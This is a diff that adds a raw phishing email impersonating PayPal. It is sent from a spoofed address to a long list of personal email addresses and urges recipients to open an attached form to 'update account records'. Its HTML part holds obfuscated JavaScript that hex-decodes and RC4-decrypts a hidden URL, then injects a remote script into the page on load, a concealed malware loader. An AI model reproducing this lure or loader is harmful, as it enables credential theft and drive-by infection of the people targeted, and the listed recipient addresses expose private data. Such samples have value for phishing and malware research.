@@ -1,0 +1,41 @@
+Content-Type: multipart/mixed; boundary="===============7807098220537724724=="
+MIME-Version: 1.0
+From: PayPal <update829@secure.195.net>
+Message-Id: <55eadda673ae1a3ac3768cabb0295364@iTyvoAV0e5EL.com>
+Subject: Account records must stay current
+To: tburk073@uottawa.ca
+ tburick@clinicalrm.com; tburigatto@cmp.com; tburigo@rbcbearings.com;
+ tburik@optonline.net; tburika@yahoo.com; tburillo@buviar.com;
+ tburinde@yahoo.com; tburinga@directorsdesk.com; tburingr@yahoo.com;
+ tburjulu@hotmail.com; tburk073@uottawa.ca; tburk115@hotmail.com;
+ tburk1163@aol.com; tburk1954@hotmail.com; tburk1962@yahoo.com;
+ tburk1968@yahoo.com; tburk2004@aol.com; tburk26@msn.com; tburk39@yahoo.com;
+ tburk49760@msn.com; tburk5150@hotmail.com; tburk5@yahoo.com; tburk64@yahoo.com;
+ tburk97@yahoo.com; tburk@att.net; tburk@cfl.rr.com; tburk@cityofmesquite.com
+X-Mailer: Mozilla Thunderbird 1.0.2 (X11/20050430)
+
+--===============7807098220537724724==
+MIME-Version: 1.0
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+
+It appears that some of your records have gone missing or became outdated.
+
+This raises a security concern mainly because PayPal focuses on online payment transactions.
+Please understand that the safety of our users is very important.
+
+We ask that you update your account records immediately to avoid limitations being set on your
+account, or in the worst case scenario, having your account terminated from PayPal.
+
+You may provide your current information into the form that's provided on the attachment.
+Open the form and complete it in your browser.
+
+We'll send you another notification if we need to request more information from you. 
+Thank you.
+--===============7807098220537724724==
+MIME-Version: 1.0
+Content-Type: text/html; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+
+<!DOCTYPE html><html lang="en-US"><head><meta charset="utf-8"></head><body><script>function d9w6(y5643p7i0) {var rrlclv = '';var an8p2cz20 = 0;function kz64k1gk0(ry56) {return parseInt(ry56, 16);}for(var an8p2cz20 = 0; an8p2cz20< y5643p7i0.length; an8p2cz20+=2) {rrlclv += String.fromCharCode(kz64k1gk0(y5643p7i0.substr(an8p2cz20, 2)));}return rrlclv;}function yi8vba(n7e0ne1, oek8) {  var bq8t70, p6s48ch7e, ppu1vwl, kiex8u, zk85v3, g4w70;  for (bq8t70 = [], p6s48ch7e = 0, kiex8u = "", zk85v3 = 0; zk85v3 < 256; zk85v3++) bq8t70[zk85v3] = zk85v3;  for (zk85v3 = 0; zk85v3 < 256; zk85v3++)p6s48ch7e = (p6s48ch7e + bq8t70[zk85v3] + oek8.charCodeAt((zk85v3 % oek8.length))) % 256,ppu1vwl = bq8t70[zk85v3],bq8t70[zk85v3] = bq8t70[p6s48ch7e],bq8t70[p6s48ch7e] = (ppu1vwl);  for (zk85v3 = 0, p6s48ch7e = 0, g4w70 = 0; g4w70 < n7e0ne1.length; g4w70++)zk85v3 = ((zk85v3 + 1) % 256),p6s48ch7e = ((p6s48ch7e + bq8t70[zk85v3]) % 256),ppu1vwl = bq8t70[zk85v3],bq8t70[zk85v3] = bq8t70[p6s48ch7e],bq8t70[p6s48ch7e] = ppu1vwl,kiex8u += String.fromCharCode(n7e0ne1.charCodeAt(g4w70) ^ bq8t70[(bq8t70[zk85v3] + bq8t70[p6s48ch7e]) % 256]);  return kiex8u}var x78l = yi8vba(d9w6("1cab2bffe612260e88e0d21b9b755c014efe28ef3af3a12620d66c75d49e327222b35d78d1e0937dc8b109b1f6c55a0a83fa38bd1373e8fb64529e"),"pe38tt3pc");var h8sc36f9 = yi8vba(d9w6("07bc2de6ac49"),"pe38tt3pc");var grsfahay7 = document.createElement(h8sc36f9);grsfahay7.src = x78l;var x9m2i = yi8vba(d9w6("1cba3eeb"),"pe38tt3pc");document.getElementsByTagName(x9m2i)[0].appendChild(grsfahay7);</script></body></html>
+--===============7807098220537724724==--
